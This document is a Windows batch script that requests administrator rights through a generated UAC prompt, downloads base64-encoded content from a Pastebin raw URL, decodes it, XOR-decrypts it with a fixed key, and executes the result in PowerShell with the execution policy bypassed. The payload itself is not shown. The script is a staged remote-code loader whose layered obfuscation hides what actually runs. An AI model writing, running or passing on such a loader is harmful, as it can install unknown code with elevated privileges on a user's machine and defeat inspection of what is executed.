@echo off
:: Ensure admin privileges
echo Checking for admin privileges...
IF "%PROCESSOR_ARCHITECTURE%" EQU "amd64" (
    >nul 2>&1 "%SYSTEMROOT%\SysWOW64\cacls.exe" "%SYSTEMROOT%\SysWOW64\config\system"
) ELSE (
    >nul 2>&1 "%SYSTEMROOT%\system32\cacls.exe" "%SYSTEMROOT%\system32\config\system"
)
if '%errorlevel%' NEQ '0' (
    goto UACPrompt
) else (
    goto gotAdmin
)

:UACPrompt
    echo Requesting admin rights...
    echo Set UAC = CreateObject^("Shell.Application"^) > "%temp%\getadmin.vbs"
    set params=%*
    echo UAC.ShellExecute "cmd.exe", "/c ""%~s0"" %params:"=""%", "", "runas", 1 >> "%temp%\getadmin.vbs"
    "%temp%\getadmin.vbs"
    del "%temp%\getadmin.vbs"
    exit /B

:gotAdmin
    echo Admin privileges confirmed.
    pushd "%CD%"
    CD /D "%~dp0"

:: Generate timestamp for unique filenames
for /f "tokens=2 delims==" %%I in ('wmic os get localdatetime /value') do set datetime=%%I
set "timestamp=%datetime:~0,4%-%datetime:~4,2%-%datetime:~6,2%_%datetime:~8,2%-%datetime:~10,2%-%datetime:~12,2%"

:: Download the base64-encoded content from Pastebin
echo Downloading script from Pastebin...
powershell -Command "Invoke-WebRequest -Uri 'https://pastebin.com/raw/qHiHS8pY' -OutFile $env:TEMP\rb_%timestamp%.ps1"
if %errorlevel% NEQ 0 (
    echo Failed to download script.
    exit /B
)
echo Script downloaded successfully.

:: Decode the base64 content
echo Decoding the script content...
powershell -Command "Add-Content $env:TEMP\decoded_%timestamp%.ps1 -Value ([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String((Get-Content $env:TEMP\rb_%timestamp%.ps1 -Raw))))"
if %errorlevel% NEQ 0 (
    echo Failed to decode script content.
    exit /B
)
echo Script decoded successfully.

:: Print the decoded content
echo Decoded script content:
type "%TEMP%\decoded_%timestamp%.ps1"

:: Apply XOR decryption with detailed logs
echo Applying XOR decryption...
powershell -Command "$content = Get-Content $env:TEMP\decoded_%timestamp%.ps1 -Raw; $splitContent = $content.Trim() -split ','; $xorDecoded = @(); foreach ($item in $splitContent) { $decoded = [char]([int]$item.Trim() -bxor 101); $xorDecoded += $decoded }; $decryptedContent = -join $xorDecoded; $decryptedContent | Set-Content $env:TEMP\decrypted_%timestamp%.ps1"

if %errorlevel% NEQ 0 (
    echo Failed to apply XOR decryption.
    exit /B
)
echo XOR decryption applied successfully.

:: Print the XOR-decrypted content
echo XOR-decrypted script content:
type "%TEMP%\decrypted_%timestamp%.ps1"
pause

:: Execute the decrypted script
echo Executing the decrypted script...
powershell -NoP -NonI -Ep Bypass -File "%TEMP%\decrypted_%timestamp%.ps1"
if %errorlevel% NEQ 0 (
    echo Execution failed.
    exit /B
)

echo Execution completed.

:: Prevent automatic exit
echo Press any key to exit...
pause